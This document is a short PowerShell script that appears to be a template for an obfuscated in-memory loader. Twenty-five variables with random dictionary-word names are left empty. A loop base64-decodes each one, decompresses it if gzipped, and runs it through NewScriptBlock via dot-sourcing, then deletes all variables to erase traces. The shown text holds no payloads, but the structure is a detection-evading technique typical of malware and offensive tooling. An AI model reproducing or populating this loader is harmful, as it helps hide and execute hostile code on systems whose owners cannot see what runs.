$Visitation = ""
$Reinstated = ""
$Abnormally = ""
$Resignedly = ""
$Acoustical = ""
$Foundation = ""
$Vocabulary = ""
$Reiterated = ""
$Abolishing = ""
$Resolution = ""
$Acquiesced = ""
$Foursquare = ""
$Everywhere = ""
$Volleyball = ""
$Rejuvenate = ""
$Abominable = ""
$Respectful = ""
$Acquirable = ""
$Fracturing = ""
$Evocations = ""
$Frequenter = ""
$Subsidizes = ""
$Timepieces = ""
$Countdowns = ""
$Reiterates = ""

$Modules = @($Visitation,$Reinstated,$Abnormally,$Resignedly,$Acoustical,$Foundation,$Vocabulary,$Reiterated,$Abolishing,$Resolution,$Acquiesced,$Foursquare,$Everywhere,$Volleyball,$Rejuvenate,$Abominable,$Respectful,$Acquirable,$Fracturing,$Evocations,$Frequenter,$Subsidizes,$Timepieces,$Countdowns,$Reiterates)
$Modules | ForEach-Object {
    $Decoded = [System.Convert]::FromBase64String($_)
    if ($_ -like "H4s*") {
        $Decoded = ConvertFrom-Gzip -Bytes $Decoded
    }
    else {
        $Decoded = [Text.Encoding]::UTF8.GetString($Decoded)
    }
    $ScriptBlock = $ExecutionContext.InvokeCommand.NewScriptBlock($Decoded)
    . $ScriptBlock
    Remove-Variable -Name "Decoded"
    Remove-Variable -Name "ScriptBlock"
}
Remove-Variable -Name "Modules"
@("Visitation","Reinstated","Abnormally","Resignedly","Acoustical","Foundation","Vocabulary","Reiterated","Abolishing","Resolution","Acquiesced","Foursquare","Everywhere","Volleyball","Rejuvenate","Abominable","Respectful","Acquirable","Fracturing","Evocations","Frequenter","Subsidizes","Timepieces","Countdowns","Reiterates") | ForEach-Object { Remove-Variable -Name $_ }
